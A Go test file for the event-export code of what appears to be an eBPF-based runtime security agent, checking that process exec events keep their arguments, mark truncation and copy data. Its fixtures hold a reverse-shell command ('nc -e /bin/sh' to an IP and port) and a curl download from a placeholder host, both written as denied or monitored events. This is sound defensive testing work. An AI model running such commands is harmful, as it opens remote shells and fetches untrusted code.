package export

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/obsernetics/pahlevan/pkg/ebpf"
)

// argv has to leave the process with the event, or the agent knows what an
// attacker ran and nothing downstream does.
func TestFromProcessEventCarriesArgs(t *testing.T) {
	ev := FromProcessEvent(&ebpf.ProcessEvent{
		CgroupID: 42, PID: 400, Comm: "nc", Filename: "/usr/bin/nc",
		Flags: ebpf.DeniedFlag,
		Args:  []string{"nc", "-e", "/bin/sh", "10.0.0.1", "4444"},
	}, ancestryNow)
	require.NotNil(t, ev)
	require.NotNil(t, ev.Exec)

	assert.Equal(t, ActionDeny, ev.Action)
	assert.Equal(t, []string{"nc", "-e", "/bin/sh", "10.0.0.1", "4444"}, ev.Exec.Args)
	assert.Equal(t, "nc -e /bin/sh 10.0.0.1 4444", ev.Exec.CommandLine)
	assert.False(t, ev.Exec.ArgsTruncated)
}

// A truncated command line must say so downstream too: reading a prefix as the
// whole invocation is how an analyst reaches the wrong conclusion.
func TestFromProcessEventMarksTruncatedArgs(t *testing.T) {
	ev := FromProcessEvent(&ebpf.ProcessEvent{
		CgroupID: 1, PID: 1, Comm: "sh", Filename: "/bin/sh",
		Args: []string{"sh", "-c", "long"}, ArgsTruncated: true,
	}, ancestryNow)
	require.NotNil(t, ev.Exec)
	assert.True(t, ev.Exec.ArgsTruncated)
	assert.Contains(t, ev.Exec.CommandLine, "...")
}

// An exec with no captured argv must not emit empty argv keys.
func TestFromProcessEventOmitsEmptyArgs(t *testing.T) {
	ev := FromProcessEvent(&ebpf.ProcessEvent{
		CgroupID: 1, PID: 1, Comm: "init", Filename: "/sbin/init",
	}, ancestryNow)
	require.NotNil(t, ev.Exec)

	data, err := json.Marshal(ev.Exec)
	require.NoError(t, err)
	assert.NotContains(t, string(data), "args")
	assert.NotContains(t, string(data), "commandLine")
}

// The exported slice must be a copy: the event is queued and the kernel decode
// buffer is reused.
func TestFromProcessEventCopiesArgs(t *testing.T) {
	src := &ebpf.ProcessEvent{
		CgroupID: 1, PID: 1, Comm: "nc", Filename: "/usr/bin/nc",
		Args: []string{"nc", "-l"},
	}
	ev := FromProcessEvent(src, ancestryNow)
	require.NotNil(t, ev.Exec)

	src.Args[0] = "tampered"
	assert.Equal(t, "nc", ev.Exec.Args[0], "the exported event must not alias the source")
}

func BenchmarkFromProcessEventWithArgs(b *testing.B) {
	src := &ebpf.ProcessEvent{
		CgroupID: 42, PID: 400, Comm: "curl", Filename: "/usr/bin/curl",
		Args:     []string{"curl", "-sk", "-o", "/tmp/x", "https://example.invalid/p"},
		Ancestry: []ebpf.Ancestor{{PID: 300, Comm: "sh"}, {PID: 1, Comm: "init"}},
	}
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = FromProcessEvent(src, ancestryNow)
	}
}
